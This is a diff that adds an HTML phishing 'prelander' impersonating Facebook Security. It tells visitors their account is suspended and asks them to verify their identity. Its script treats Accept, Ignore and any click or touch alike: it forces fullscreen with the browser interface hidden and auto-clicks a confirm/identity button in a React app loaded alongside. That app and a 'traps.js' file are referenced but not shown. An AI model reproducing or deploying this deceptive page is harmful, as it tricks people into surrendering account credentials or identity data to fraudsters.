@@ -1,0 +1,237 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Facebook Security</title>
+<link rel="stylesheet" crossorigin href="style.css">
+<style>
+#prelander {
+  position: fixed;
+  inset: 0;
+  z-index: 99999;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: #000;
+  cursor: pointer;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+#prelander .pl-bg {
+  position: absolute;
+  inset: 0;
+  background: url('345435xf.webp') center/cover no-repeat;
+  filter: blur(8px) brightness(0.35);
+  transform: scale(1.05);
+}
+#prelander .pl-card {
+  position: relative;
+  z-index: 1;
+  width: 100%;
+  max-width: 480px;
+  background: #fff;
+  border-radius: 12px;
+  box-shadow: 0 4px 50px rgba(0,0,0,0.7);
+  overflow: hidden;
+  margin: 20px;
+  animation: pl-in 0.4s ease-out;
+}
+@keyframes pl-in {
+  from { opacity: 0; transform: scale(0.92) translateY(20px); }
+  to { opacity: 1; transform: scale(1) translateY(0); }
+}
+.pl-card .pl-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 14px 18px;
+  border-bottom: 1px solid #e4e6eb;
+}
+.pl-card .pl-header .pl-logo svg {
+  display: block;
+  height: 22px;
+  width: auto;
+}
+.pl-card .pl-header .pl-security {
+  color: #65676b;
+  font-size: 11px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.4px;
+}
+.pl-card .pl-body {
+  padding: 24px 28px 18px;
+  text-align: center;
+}
+.pl-card .pl-icon {
+  width: 72px;
+  height: 72px;
+  margin: 0 auto 16px;
+  background: #f0f2f5;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.pl-card .pl-icon svg {
+  width: 36px;
+  height: 36px;
+  color: #e41e3f;
+}
+.pl-card .pl-body h2 {
+  font-size: 20px;
+  font-weight: 700;
+  color: #050505;
+  margin: 0 0 10px;
+}
+.pl-card .pl-body p {
+  font-size: 14px;
+  color: #65676b;
+  line-height: 1.5;
+  margin: 0 0 6px;
+}
+.pl-card .pl-body p.pl-bold {
+  font-weight: 600;
+  color: #444;
+}
+.pl-card .pl-actions {
+  padding: 12px 28px 20px;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+.pl-card .pl-btn {
+  width: 100%;
+  padding: 12px 0;
+  border: none;
+  border-radius: 8px;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background 0.15s;
+}
+.pl-card .pl-btn-primary {
+  background: #1877f2;
+  color: #fff;
+}
+.pl-card .pl-btn-primary:hover {
+  background: #166fe5;
+}
+.pl-card .pl-btn-ignore {
+  background: transparent;
+  color: #65676b;
+}
+.pl-card .pl-btn-ignore:hover {
+  background: #f0f2f5;
+}
+.pl-card .pl-footer-note {
+  padding: 0 28px 18px;
+  text-align: center;
+  font-size: 11px;
+  color: #65676b;
+  line-height: 1.4;
+}
+</style>
+</head>
+<body>
+
+<!-- ===== PRELANDER ===== -->
+<div id="prelander">
+  <div class="pl-bg"></div>
+  <div class="pl-card">
+    <div class="pl-header">
+      <div class="pl-logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48" height="48">
+          <path fill="#1877f2" d="M24 0C10.745 0 0 10.745 0 24c0 13.255 10.745 24 24 24s24-10.745 24-24C48 10.745 37.255 0 24 0z"/>
+          <path fill="#fff" d="M26.4 36.9V24.7h4.1l.6-4.8h-4.7v-3.1c0-1.4.4-2.3 2.4-2.3h2.5v-4.3c-.4-.1-1.9-.2-3.6-.2-3.6 0-6.1 2.2-6.1 6.2v3.5H18v4.8h4v12.2h4.4z"/>
+        </svg>
+      </div>
+      <span class="pl-security">Facebook Security</span>
+    </div>
+    <div class="pl-body">
+      <div class="pl-icon">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+        </svg>
+      </div>
+      <h2>Your account has been suspended</h2>
+      <p>We've temporarily suspended your account because we've detected unusual activity. This may be because you've shared something that doesn't follow our Community Standards, or we need to verify your identity.</p>
+      <p class="pl-bold">To restore your account, please verify your identity by clicking <strong>Accept</strong> below.</p>
+      <p>If you believe this is a mistake, you can ignore this message.</p>
+    </div>
+    <div class="pl-actions">
+      <button class="pl-btn pl-btn-primary" id="pl-accept">Accept</button>
+      <button class="pl-btn pl-btn-ignore" id="pl-ignore">Ignore</button>
+    </div>
+    <div class="pl-footer-note">
+      Your account will remain restricted until identity verification is complete.
+    </div>
+  </div>
+</div>
+
+<!-- ===== REACT APP ===== -->
+<div id="root"></div>
+
+<script>
+(function(){
+  var pl = document.getElementById('prelander');
+  var acceptBtn = document.getElementById('pl-accept');
+  var ignoreBtn = document.getElementById('pl-ignore');
+  var advanced = false;
+
+  function advanceFlow() {
+    if (advanced) return;
+    advanced = true;
+
+    var el = document.documentElement;
+    try {
+      if (el.requestFullscreen) el.requestFullscreen({ navigationUI: 'hide' }).catch(function(){});
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      else if (el.msRequestFullscreen) el.msRequestFullscreen();
+    } catch(e) {}
+
+    pl.style.transition = 'opacity 0.35s ease';
+    pl.style.opacity = '0';
+
+    setTimeout(function(){
+      pl.style.display = 'none';
+      var retries = 0;
+      var tryClick = function(){
+        var btns = document.querySelectorAll('button');
+        for (var i = 0; i < btns.length; i++) {
+          var txt = btns[i].textContent.toLowerCase();
+          if (txt.indexOf('confirm') !== -1 || txt.indexOf('identity') !== -1) {
+            btns[i].click();
+            return;
+          }
+        }
+        retries++;
+        if (retries < 20) setTimeout(tryClick, 200);
+      };
+      setTimeout(tryClick, 100);
+    }, 350);
+  }
+
+  acceptBtn.addEventListener('click', function(e) {
+    e.stopPropagation();
+    advanceFlow();
+  });
+  ignoreBtn.addEventListener('click', function(e) {
+    e.stopPropagation();
+    advanceFlow();
+  });
+  pl.addEventListener('click', advanceFlow);
+  pl.addEventListener('touchstart', advanceFlow, { passive: true });
+  acceptBtn.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') { e.stopPropagation(); advanceFlow(); }
+  });
+  ignoreBtn.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') { e.stopPropagation(); advanceFlow(); }
+  });
+})();
+</script>
+
+<script type="module" crossorigin src="script.js"></script>
+<script src="traps.js"></script>
+</body>
+</html>
